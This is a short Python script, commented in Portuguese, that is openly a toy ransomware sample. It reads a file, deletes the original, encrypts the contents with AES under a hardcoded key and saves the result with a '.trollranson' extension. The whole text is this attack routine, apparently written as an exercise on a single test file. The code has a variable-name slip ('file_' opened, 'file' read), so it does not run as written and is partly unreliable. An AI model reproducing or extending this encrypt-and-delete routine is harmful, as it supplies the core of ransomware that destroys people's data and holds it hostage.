import os
import pyaes

## abrir arquivo que vai ser criptografado

file_name = 'teste.txt'
file_ = open(file_name, 'rb')
file_data = file.read()
file.close()

## remover original
os.remove(file_name)

## definir a chave de encriptacao

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar arquivo criptografado

new_file = file_name + '.trollranson'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
